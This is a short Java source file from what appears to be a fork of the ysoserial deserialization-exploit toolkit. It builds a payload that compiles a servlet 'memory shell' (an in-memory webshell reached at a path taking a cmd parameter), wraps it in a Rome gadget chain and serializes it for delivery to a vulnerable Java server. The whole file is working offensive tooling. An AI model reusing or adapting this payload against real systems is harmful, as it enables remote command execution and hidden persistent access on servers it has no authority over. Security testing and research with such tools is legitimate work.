package ysoserial.payloads.memshell;

import java.io.InputStream;
import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;

import ysoserial.payloads.util.*;

//servlet 内存马 /1nhann?cmd=id
public class ServletShell{
    public static void main(final String[] args) throws Exception {
        Object evil = new ServletShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        InputStream inputStream = ServletShell.class.getClassLoader().getResourceAsStream("ServletShell.java");
        byte[] bytes = IOUtils.toByteArray(inputStream);
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("ServletShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

}
